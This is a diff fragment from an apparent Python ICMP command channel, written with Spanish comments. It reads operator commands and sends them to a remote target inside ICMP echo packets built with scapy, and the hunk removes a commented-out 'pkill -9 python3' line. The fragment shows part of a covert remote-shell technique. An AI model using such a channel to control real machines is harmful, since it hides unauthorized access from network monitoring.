@@ -40,7 +40,6 @@ while True:
         comando = input("Comando: ")
         if comando == "exit":
             print(f"Terminando el proceso en maquina remota [{args.target}]")
-            #terminar_proceso = "pkill -9 python3"
             pterminar = IP(dst = destino,ttl=64)/ICMP(type=8,code=0,id=id_icmp)/comando
             send(pterminar)
             time.sleep(2)
